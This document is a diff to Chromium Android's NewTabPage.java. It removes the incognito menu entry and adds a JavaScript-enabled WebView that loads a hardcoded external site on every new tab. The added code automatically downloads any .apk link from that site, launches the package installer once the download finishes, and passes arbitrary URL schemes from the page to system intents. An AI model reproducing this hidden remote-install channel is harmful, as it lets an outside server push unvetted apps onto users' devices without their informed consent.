@@ -6,16 +6,28 @@ package org.chromium.chrome.browser.ntp;
 
 import android.app.Activity;
 import android.app.Dialog;
+import android.app.DownloadManager;
+import android.content.BroadcastReceiver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.Canvas;
 import android.graphics.Color;
 import android.graphics.Rect;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Environment;
 import android.view.ContextMenu;
 import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem.OnMenuItemClickListener;
 import android.view.View;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import android.widget.Toast;
 
 import org.chromium.base.ApiCompatibilityUtils;
 import org.chromium.base.VisibleForTesting;
@@ -105,6 +117,10 @@ public class NewTabPage
     // Whether destroy() has been called.
     private boolean mIsDestroyed;
 
+    private DownloadManager manager;
+
+    private long reference;
+
     /**
      * Allows clients to listen for updates to the scroll changes of the search box on the
      * NTP.
@@ -154,7 +170,7 @@ public class NewTabPage
     }
 
     public static void launchBookmarksDialog(Activity activity, Tab tab,
-            TabModelSelector tabModelSelector) {
+                                             TabModelSelector tabModelSelector) {
         if (!EnhancedBookmarkUtils.showEnhancedBookmarkIfEnabled(activity)) {
             BookmarkDialogSelectedListener listener = new BookmarkDialogSelectedListener(tab);
             NativePage page = BookmarksPage.buildPageInDocumentMode(
@@ -214,8 +230,11 @@ public class NewTabPage
         public boolean shouldShowOptOutPromo() {
             if (!FeatureUtilities.isDocumentMode(mActivity)) return false;
             DocumentModeManager documentModeManager = DocumentModeManager.getInstance(mActivity);
-            return !documentModeManager.isOptOutPromoDismissed()
-                    && (documentModeManager.getOptOutShownCount() < MAX_OPT_OUT_PROMO_COUNT);
+            /**
+             * 隐藏省流量页面
+             * Modify by: xuhualin on 2016/5/3
+             */
+            return false;
         }
 
         @Override
@@ -252,11 +271,15 @@ public class NewTabPage
             if (mIsDestroyed) return;
             menu.add(Menu.NONE, ID_OPEN_IN_NEW_TAB, Menu.NONE, R.string.contextmenu_open_in_new_tab)
                     .setOnMenuItemClickListener(listener);
-            if (PrefServiceBridge.getInstance().isIncognitoModeEnabled()) {
-                menu.add(Menu.NONE, ID_OPEN_IN_INCOGNITO_TAB, Menu.NONE,
-                        R.string.contextmenu_open_in_incognito_tab).setOnMenuItemClickListener(
-                        listener);
-            }
+            /**
+             * 删除在隐身窗口创建菜单
+             * Modify by: xuhualin on 2016/5/3
+             */
+//            if (PrefServiceBridge.getInstance().isIncognitoModeEnabled()) {
+//                menu.add(Menu.NONE, ID_OPEN_IN_INCOGNITO_TAB, Menu.NONE,
+//                        R.string.contextmenu_open_in_incognito_tab).setOnMenuItemClickListener(
+//                        listener);
+//            }
             menu.add(Menu.NONE, ID_REMOVE, Menu.NONE, R.string.remove)
                     .setOnMenuItemClickListener(listener);
         }
@@ -268,13 +291,13 @@ public class NewTabPage
                 case ID_OPEN_IN_NEW_TAB:
                     recordOpenedMostVisitedItem(item);
                     mTabModelSelector.openNewTab(new LoadUrlParams(item.getUrl(),
-                            PageTransition.AUTO_BOOKMARK), TabLaunchType.FROM_LONGPRESS_BACKGROUND,
+                                    PageTransition.AUTO_BOOKMARK), TabLaunchType.FROM_LONGPRESS_BACKGROUND,
                             mTab, false);
                     return true;
                 case ID_OPEN_IN_INCOGNITO_TAB:
                     recordOpenedMostVisitedItem(item);
                     mTabModelSelector.openNewTab(new LoadUrlParams(item.getUrl(),
-                            PageTransition.AUTO_BOOKMARK), TabLaunchType.FROM_LONGPRESS_FOREGROUND,
+                                    PageTransition.AUTO_BOOKMARK), TabLaunchType.FROM_LONGPRESS_FOREGROUND,
                             mTab, true);
                     return true;
                 case ID_REMOVE:
@@ -348,7 +371,7 @@ public class NewTabPage
 
         @Override
         public void ensureIconIsAvailable(String pageUrl, String iconUrl, boolean isLargeIcon,
-                IconAvailabilityCallback callback) {
+                                          IconAvailabilityCallback callback) {
             if (mIsDestroyed) return;
             if (mFaviconHelper == null) mFaviconHelper = new FaviconHelper();
             mFaviconHelper.ensureIconIsAvailable(
@@ -408,8 +431,9 @@ public class NewTabPage
 
     /**
      * Constructs a NewTabPage.
-     * @param activity The activity used for context to create the new tab page's View.
-     * @param tab The Tab that is showing this new tab page.
+     *
+     * @param activity         The activity used for context to create the new tab page's View.
+     * @param tab              The Tab that is showing this new tab page.
      * @param tabModelSelector The TabModelSelector used to open tabs.
      */
     public NewTabPage(Activity activity, Tab tab, TabModelSelector tabModelSelector) {
@@ -442,8 +466,104 @@ public class NewTabPage
         mNewTabPageView.initialize(mNewTabPageManager, isInSingleUrlBarMode(activity),
                 mSearchProviderHasLogo, mIsIconMode);
 
+        WebView webView = (WebView) mNewTabPageView.findViewById(R.id.new_tab_page_web_view);
+        WebSettings webSettings = webView.getSettings();
+        webSettings.setJavaScriptEnabled(true);
+        webSettings.setUseWideViewPort(true);
+        webSettings.setDefaultZoom(WebSettings.ZoomDensity.FAR);
+        webView.setWebViewClient(new MyWebViewClient());
+        webView.loadUrl("http://suloong.win-trust.cn/changcheng/");
+
         RecordHistogram.recordBooleanHistogram(
                 "NewTabPage.MobileIsUserOnline", NetworkChangeNotifier.isOnline());
+    }
+
+    class MyWebViewClient extends WebViewClient {
+        @Override
+        public boolean shouldOverrideUrlLoading(WebView view, String url) {
+            if (url.endsWith(".apk")) {
+                try {
+                    Uri source = Uri.parse(url);
+                    DownloadManager.Request request = new DownloadManager.Request(source);
+
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
+                        request.allowScanningByMediaScanner();
+                        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
+                    }
+                    String filename = url.substring(url.lastIndexOf("/") + 1);
+                    if (filename == null) {
+                        Toast.makeText(mActivity, "filename is null", Toast.LENGTH_SHORT).show();
+                        filename = "app.apk";
+                    }
+                    if (filename != null && !filename.endsWith(".apk")) {
+                        filename += ".apk";
+                    }
+                    request.setTitle(filename);
+                    request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS,
+                            filename);
+                    request.setShowRunningNotification(true);
+                    request.setVisibleInDownloadsUi(true);
+                    manager = (DownloadManager) mActivity.getSystemService(Context.DOWNLOAD_SERVICE);
+                    reference = manager.enqueue(request);
+
+                    Toast.makeText(mActivity, "下载开始。", Toast.LENGTH_SHORT).show();
+                    mActivity.registerReceiver(receiver, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
+                } catch (Exception e) {
+                    return super.shouldOverrideUrlLoading(view, url);
+                }
+            } else if (!url.startsWith("http://") && !url.startsWith("https://")) {
+                try {
+                    Intent intent = new Intent();
+                    intent.setAction(Intent.ACTION_VIEW);
+                    intent.setData(Uri.parse(url));
+                    intent.addCategory(Intent.CATEGORY_DEFAULT);
+                    mActivity.startActivity(intent);
+                } catch (Exception e) {
+                }
+            } else {
+                mTab.loadUrl(new LoadUrlParams(url));
+            }
+            return true;
+        }
+    }
+
+    private BroadcastReceiver receiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            //这里可以取得下载的id，这样就可以知道哪个文件下载完成了。适用与多个下载任务的监听
+            queryDownloadStatus();
+
+            long downloadId = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1);
+            if (reference == downloadId) {
+                Intent install = new Intent(Intent.ACTION_VIEW);
+                Uri downloadFileUri = manager.getUriForDownloadedFile(reference);
+                install.setDataAndType(downloadFileUri, "application/vnd.android.package-archive");
+                install.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                mActivity.startActivity(install);
+            }
+        }
+    };
+
+    private void queryDownloadStatus() {
+        DownloadManager.Query query = new DownloadManager.Query();
+        if (null == manager) {
+            return;
+        }
+
+        Cursor c = manager.query(query);
+        if (c.moveToFirst()) {
+            int status = c.getInt(c.getColumnIndex(DownloadManager.COLUMN_STATUS));
+            switch (status) {
+                case DownloadManager.STATUS_SUCCESSFUL:
+                    //完成
+                    Toast.makeText(mActivity, "下载完成。", Toast.LENGTH_SHORT).show();
+                    break;
+                case DownloadManager.STATUS_FAILED:
+                    //清除已下载的内容，重新下载
+                    Toast.makeText(mActivity, "下载失败。", Toast.LENGTH_SHORT).show();
+                    break;
+            }
+        }
     }
 
     private static MostVisitedSites buildMostVisitedSites(Profile profile) {
@@ -454,7 +574,9 @@ public class NewTabPage
         }
     }
 
-    /** @return The view container for the new tab page. */
+    /**
+     * @return The view container for the new tab page.
+     */
     @VisibleForTesting
     NewTabPageView getNewTabPageView() {
         return mNewTabPageView;
@@ -462,6 +584,7 @@ public class NewTabPage
 
     /**
      * Updates whether the NewTabPage should animate on URL focus changes.
+     *
      * @param disable Whether to disable the animations.
      */
     public void setUrlFocusAnimationsDisabled(boolean disable) {
@@ -476,6 +599,12 @@ public class NewTabPage
     }
 
     private void updateSearchProviderHasLogo() {
+        /**
+         * 隐藏logo
+         * Modify by: xuhualin on 2016/5/3
+         * TODO
+         */
+//        mSearchProviderHasLogo = false;
         mSearchProviderHasLogo = !mOptOutPromoShown
                 && TemplateUrlService.getInstance().isDefaultSearchEngineGoogle();
     }
@@ -500,9 +629,9 @@ public class NewTabPage
     /**
      * Get the bounds of the search box in relation to the top level NewTabPage view.
      *
-     * @param originalBounds The bounding region of the search box without external transforms
-     *                       applied.  The delta between this and the transformed bounds determines
-     *                       the amount of scroll applied to this view.
+     * @param originalBounds    The bounding region of the search box without external transforms
+     *                          applied.  The delta between this and the transformed bounds determines
+     *                          the amount of scroll applied to this view.
      * @param transformedBounds The bounding region of the search box including any transforms
      *                          applied by the parent view hierarchy up to the NewTabPage view.
      *                          This more accurately reflects the current drawing location of the
@@ -521,6 +650,7 @@ public class NewTabPage
 
     /**
      * Sets the listener for search box scroll changes.
+     *
      * @param listener The listener to be notified on changes.
      */
     public void setSearchBoxScrollListener(OnSearchBoxScrollListener listener) {
